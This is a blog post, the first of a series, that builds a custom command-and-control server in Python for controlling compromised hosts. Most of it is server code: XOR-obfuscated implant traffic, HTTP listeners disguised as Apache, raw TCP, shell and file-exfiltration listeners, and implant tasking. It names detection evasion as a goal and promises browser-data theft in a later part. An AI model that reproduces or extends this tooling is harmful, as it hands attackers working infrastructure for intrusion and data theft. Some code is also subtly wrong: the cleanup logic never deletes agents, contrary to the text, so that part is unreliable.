---
layout: post
title: "Building a Custom C2 Server from Scratch Part1"
date: 2025-11-21
categories: [Red Team,Malware Development,C2,Evasion,Blue Team,Cybersecurity]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---


## **Introduction: The Art of Covert Communications**

In the realm of cybersecurity, few concepts capture the imagination quite like Command and Control (C2) servers. These digital puppet masters orchestrate operations across compromised networks, serving as the central nervous system for red team operations, penetration testing, and unfortunately, malicious campaigns. But what exactly goes into building one of these sophisticated systems from the ground up?

Welcome to our technical journey where we peel back the layers of C2 infrastructure to reveal the intricate architecture that powers covert communications. In this comprehensive series, we're not just analyzing existing tools, we're building our own fully-featured C2 server and its companion C++ agent from absolute scratch.

**Why Build Custom C2 Infrastructure?**

While off-the-shelf C2 frameworks like Cobalt Strike and Metasploit dominate the landscape, there are compelling reasons to understand and build custom solutions:

- **Educational Value**: Deep understanding of network protocols, encryption, and system architecture
- **Detection Evasion**: Custom implementations bypass signature-based detection
- **Tailored Operations**: Purpose-built for specific engagement requirements
- **Skill Development**: Mastering the fundamentals of remote administration tools

**What You'll Discover in This Series**

In this first installment, we'll dive deep into the server-side architecture, where we've engineered:

- **Multi-Protocol Stealth**: HTTP and TCP channels that blend with legitimate traffic
- **Encrypted Communications**: Custom XOR+Base64 encryption with integrity checks
- **Agent Management**: Sophisticated tracking of connected implants with health monitoring
- **Task Orchestration**: Feature-based architecture for executing remote operations
- **File Exfiltration**: Reliable binary transfer protocols for data collection
- **Real-time Interaction**: Live shell sessions with bidirectional communication
 
Disclaimer: This project is designed for educational purposes, always ensure you have proper authorization before deploying any security testing tools.

## **Project Architecture Overview**

Before diving into code, let's understand the overall architecture:
- HTTP Listener (Port 8080) - Encrypted agent communication
- TCP Listener (Port 4444) - Alternative encrypted channel
- Shell Listener (Port 8081) - Real-time interactive shells
- File Listener (Port 8083) - File transfer operations
- Console Interface - Operator command interface

Let's begin our journey into the heart of custom C2 infrastructure.

## **1\. Core Dependencies and Imports**

Let's start with the foundation. The imports and basic setup:

	from enum import Enum
	from dataclasses import dataclass, asdict
	from typing import Dict, List, Optional, Tuple
	from datetime import datetime

	import threading
	import json
	import time
	import socket
	import logging
	import base64
	import os
	import struct
	import select

**Key Dependencies Explained:**

- threading - Handle multiple concurrent connections
- socket - Network communication backbone
- dataclasses - Clean data structures for agents and tasks
- enum - Type-safe status enumerations
- select - Non-blocking I/O operations

## **2\. Encryption System - SimpleXOREncryption**

First, we built our custom encryption layer:

	import json
	import base64
	class SimpleXOREncryption:

    def __init__(self, key: str = "<XOR Key>"):
        self.key = key

    def encrypt_message(self, plaintext: dict) -> str:
        # Convert dict to JSON string
        plaintext_str = json.dumps(plaintext)
        plaintext_bytes = plaintext_str.encode('utf-8')

        # XOR encrypt byte by byte
        encrypted_bytes = bytearray()
        for i, byte in enumerate(plaintext_bytes):
            encrypted_bytes.append(byte ^ ord(self.key[i % len(self.key)]))

        # Add checksum for integrity verification
        checksum = 0
        for byte in encrypted_bytes:
            checksum ^= byte
        encrypted_bytes.append(checksum)

        # Return as base64 for safe transport
        return base64.b64encode(bytes(encrypted_bytes)).decode('ascii')

    def decrypt_message(self, encrypted_b64: str) -> dict:
        # Decode from base64
        encrypted_data = base64.b64decode(encrypted_b64)

        if len(encrypted_data) < 2:
            raise ValueError("Encrypted data too short")

        # Verify checksum
        checksum = 0
        for byte in encrypted_data[:-1]:
            checksum ^= byte
        if checksum != encrypted_data[-1]:
            raise ValueError("Checksum verification failed")

        # XOR decrypt
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_data[:-1]):
            decrypted_bytes.append(byte ^ ord(self.key[i % len(self.key)]))

        # Parse back to dictionary
        plaintext_str = bytes(decrypted_bytes).decode('utf-8')
        return json.loads(plaintext_str)

**Why This Encryption Approach?**

- **XOR Operation**: Simple, fast, and reversible
- **Checksum Verification**: Ensures data integrity
- **Base64 Encoding**: Safe for network transmission
- **No External Dependencies**: Self-contained implementation

## **3\. Data Models - Agent and Task Management**

We used Python dataclasses for clean data management:

	class AgentStatus(Enum):
    	ACTIVE = "active"
    	DEAD = "dead"
    	LOST = "lost"

	@dataclass
	class Agent:
    	agent_id: str
    	hostname: str
    	username: str
    	ip_address: str
    	os: str
    	process_id: int
    	checkin_time: float
    	status: AgentStatus
    	last_seen: float
    	agent_type: str = "unknown"
	@dataclass
	class Task:
    	task_id: str
    	agent_id: str
    	command: str
    	args: List[str]
    	created_time: float
    	completed_time: Optional[float] = None
    	result: Optional[str] = None
    	status: str = "pending"  # pending, running, completed, failed

**Data Structure Benefits:**

- **Type Safety**: Clear data types and structure
- **Immutability**: Prevents accidental modification
- **Serialization**: Easy JSON conversion for storage/transmission

## **4\. The Core C2Server Class**

This is the heart of our C2 server, let's break it down section by section.

### **4.1 Initialization and Setup**

	 def __init__(self, host='<ATTACKER_IP>', http_port=8080, tcp_port=4444,
                 shell_port=8081, file_port=8083, encryption_key="<XOR_KEY>"):

        self.host = host
        self.http_port = http_port
        self.tcp_port = tcp_port
        self.shell_port = shell_port
        self.file_port = file_port

        # Initialize encryption
        self.encryption = SimpleXOREncryption(encryption_key)

        # Core data structures
        self.agents: Dict[str, Agent] = {}
        self.tasks: Dict[str, Task] = {}
        self.listeners: Dict[str, threading.Thread] = {}

        # Real-time sessions
        self.shell_sessions: Dict[str, socket.socket] = {}
        self.shell_lock = threading.Lock()

        # Threading controls
        self._running = False
        self._lock = threading.Lock()

        # Counters
        self.next_agent_id = 1
        self.next_task_id = 1

        self.setup_logging()
        logging.info("Simple XOR Encrypted C2 Server initialized")


**Key Components:**

- **Multiple Ports**: Dedicated ports for different functions
- **Thread-Safe Structures**: Locks for concurrent access
- **Session Management**: Track active shell sessions
- **Comprehensive Logging**: Audit trail for all operations

### **4.2 Listener System - The Network Foundation**

Our server runs multiple listeners simultaneously:


    def start(self):
        """Start the C2 server and all listeners"""

        if self._running:
            return False

        self._running = True
        logging.info("Starting Simple XOR Encrypted C2 Server...")

        # Start HTTP Listener
        http_thread = threading.Thread(target=self.start_http_listener, daemon=True)
        http_thread.start()
        self.listeners['http'] = http_thread

        # Start TCP Listener
        tcp_thread = threading.Thread(target=self.start_tcp_listener, daemon=True)
        tcp_thread.start()
        self.listeners['tcp'] = tcp_thread

        # Start Shell Listener
        shell_thread = threading.Thread(target=self.start_shell_listener, daemon=True)
        shell_thread.start()
        self.listeners['shell'] = shell_thread

        # Start File Transfer Listener
        file_thread = threading.Thread(target=self.start_file_listener, daemon=True)
        file_thread.start()
        self.listeners['file'] = file_thread

        # Start agent cleanup thread
        cleanup_thread = threading.Thread(target=self.agent_cleanup_worker, daemon=True)
        cleanup_thread.start()

        logging.info(f"C2 Server started successfully")
        return True

**Listener Architecture:**

- **HTTP Listener**: Standard web protocol for agent checkins
- **TCP Listener**: Raw socket alternative channel
- **Shell Listener**: Real-time interactive command sessions
- **File Listener**: Dedicated file transfer channel
- **Daemon Threads**: Automatic cleanup when main thread exits

### **4.3 Encrypted Message Handling**

## **HTTP Communication Handler**

### **Stealth Through Protocol Mimicry**

This function makes our C2 traffic blend with normal web traffic by implementing proper HTTP protocol handling. This provides significant advantages for evasion.

### **Request Processing Logic**

The function handles three types of HTTP requests:

**POST Requests - Agent Checkins**  
When an agent sends a POST request, we extract the encrypted data from the request body and process it through our checkin system.

	if first_line.startswith('POST'):
    	parts = request.split('\r\n\r\n')
    	if len(parts) >= 2:
        	encrypted_data = parts[1].strip()
        	encrypted_response = self.handle_encrypted_checkin(
            	encrypted_data, client_address[0], 'http'
     	   )

**GET Requests - Probing and Decoy**  
GET requests from scanners or curious systems receive benign responses to avoid raising suspicion.

**Unsupported Methods**  
Any other HTTP methods receive proper 405 Method Not Allowed responses.

### **Response Crafting**

We craft realistic HTTP responses that mimic a normal web server:

	http_response = (
    	"HTTP/1.1 200 OK\r\n"
    	"Content-Type: text/plain\r\n"
    	f"Content-Length: {len(encrypted_response)}\r\n"
    	"Connection: close\r\n"
    	"Server: Apache/2.4.41 (Unix)\r\n"
    	"\r\n"
    	f"{encrypted_response}"
	)

### **Stealth Advantages**

- **Protocol Compliance**: Uses standard HTTP status codes and headers
- **Server Impersonation**: Fake Server header makes traffic look like Apache
- **Proper Error Handling**: Returns appropriate HTTP error codes
- **Connection Management**: Uses standard Connection: close headers

## **Raw TCP Communication**

### **When HTTP Isn't Enough**

While HTTP provides excellent stealth, sometimes you need the raw efficiency of TCP. This function provides an alternative communication channel that's less overhead and can handle larger payloads.

### **Data Reception Strategy**

Unlike HTTP with its clear message boundaries, raw TCP requires careful data reassembly:

	data_chunks = []
	total_received = 0

	while True:
    	chunk = client_socket.recv(4096)
    	if not chunk:
        	break

    	data_chunks.append(chunk)
    	total_received += len(chunk)

### **Memory Management**

We implement safeguards against memory exhaustion:

	if total_received > 10 * 1024 * 1024:  # 10MB limit
    	break

### **Reliable Data Transmission**

Sending responses also happens in chunks to handle large messages:

	total_sent = 0
	chunk_size = 4096

	while total_sent < len(response_bytes):
    	chunk = response_bytes[total_sent:total_sent + chunk_size]
    	sent = client_socket.send(chunk)
    	total_sent += sent

### **TCP Protocol Benefits**

- **Lower Overhead**: No HTTP headers reduce bandwidth usage
- **Larger Messages**: Can handle bigger encrypted payloads
- **Binary Friendly**: Naturally handles binary data without encoding
- **Performance**: Faster for bulk data transfers

## **The Brain: handle_encrypted_checkin()**

### **Central Command Processing**

This function is the core intelligence of our C2 server. It processes all agent communications, manages agent state, and coordinates task execution.

### **Multi-Stage Processing Pipeline**

**Stage 1: Decryption and Validation**  
The function first decrypts the incoming message and validates its structure:

agent_data = self.encryption.decrypt_message(encrypted_data)

	required_fields = ['agent_id', 'hostname', 'username', 'os', 'pid']
	for field in required_fields:
    	if field not in agent_data:
        	agent_data[field] = 'unknown'

**Stage 2: Agent Management**  
Each checkin updates the agent's status and last-seen timestamp:

agent_id = self.register_agent(agent_data, client_ip, connection_type)

**Stage 3: Task Result Processing**  
The function processes any task results the agent is reporting:

	if 'task_results' in agent_data:
    	self.process_task_results(agent_id, agent_data['task_results'])

**Stage 4: Task Assignment**  
The server checks for pending tasks and assigns them to the agent:

	pending_tasks = self.get_pending_tasks(agent_id)

**Stage 5: Response Preparation**  
Finally, the server prepares and encrypts the response:

	response_data = {
    	'status': 'success',
    	'agent_id': agent_id,
    	'tasks': pending_tasks,
    	'server_time': time.time(),
    	'next_checkin': 60
	}

**Communication Flow:**

- **Agent Sends**: Encrypted system info + task results
- **Server Processes**: Updates agent status, stores results
- **Server Responds**: Encrypted task list for agent
- **Agent Executes**: Tasks and stores results for next checkin

### **4.5 Agent Management System**

The register_agent() function is crucial for maintaining the state of all connected agents. It serves as the central registry that tracks every agent's status, location, and capabilities.

### **Registration Logic and State Management**

When an agent checks in for the first time, the registration system creates a comprehensive profile:

    def register_agent(self, agent_data: dict, ip_address: str, agent_type: str) -> str:

    	with self._lock:  # Thread-safe operation
        	agent_id = agent_data.get('agent_id')

        	if not agent_id or agent_id not in self.agents:

            # New agent registration
            	agent_id = agent_id or f"agent_{self.next_agent_id}"
            	self.next_agent_id += 1

            	self.agents[agent_id] = Agent(
                	agent_id=agent_id,
                	hostname=agent_data.get('hostname', 'unknown'),
                	username=agent_data.get('username', 'unknown'),
                	ip_address=ip_address,
                	os=agent_data.get('os', 'unknown'),
                	process_id=agent_data.get('pid', 0),
                	checkin_time=time.time(),
                	last_seen=time.time(),
                	status=AgentStatus.ACTIVE,
                	agent_type=agent_type
            )

            	logging.info(f"New agent registered: {agent_id} from {ip_address}")
            	print(f"[+] New agent: {agent_id} - {agent_data.get('hostname')} - {agent_data.get('username')}")

        	else:
            # Existing agent update
            	self.agents[agent_id].last_seen = time.time()
            	self.agents[agent_id].status = AgentStatus.ACTIVE
        	return agent_id

### **Agent State Transitions**

The system manages three agent states:

- **ACTIVE**: Recently checked in (within 5 minutes)
- **LOST**: No checkin for 5+ minutes
- **DEAD**: No checkin for 30+ minutes (auto-removed)

The cleanup worker runs continuously:

    def agent_cleanup_worker(self):

    	while self._running:
        	current_time = time.time()

       		with self._lock:
            	for agent_id, agent in list(self.agents.items()):

                	if current_time - agent.last_seen > 300:  # 5 minutes
                    	if agent.status == AgentStatus.ACTIVE:
                        	agent.status = AgentStatus.LOST

                	elif current_time - agent.last_seen > 1800:  # 30 minutes
                    	del self.agents[agent_id]

        	time.sleep(60)

**Agent Lifecycle Management:**

- **Registration**: First contact creates agent record
- **Heartbeats**: Regular checkins update last_seen timestamp
- **Status Tracking**: Active, Lost, Dead states
- **Auto Cleanup**: Remove inactive agents

so that's it for now. in the next part we'll continue on how we make another features like Real-time Shell, File-Upload, Screenshots and Browser Data Extraction. 

Stay tuned!!. 